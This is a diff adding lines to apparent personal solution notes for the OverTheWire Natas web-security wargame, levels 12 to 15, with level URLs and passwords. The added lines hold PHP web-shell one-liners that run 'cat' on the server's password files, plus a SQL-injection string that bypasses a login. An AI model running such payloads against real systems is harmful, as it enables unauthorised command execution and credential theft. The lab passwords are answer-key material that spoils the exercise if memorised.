@@ -36,3 +36,20 @@ echo base64_encode(xor_encrypt($var3));
 
 http://natas12.natas.labs.overthewire.org/
 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+<?echo passthru("cat /etc/natas_webpass/natas13")?>
+
+http://natas13.natas.labs.overthewire.org/
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+<?echo passthru("cat /etc/natas_webpass/natas14")?>
+
+http://natas14.natas.labs.overthewire.org/
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+id : 1
+pw : "or"1"="1
+
+http://natas15.natas.labs.overthewire.org/
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
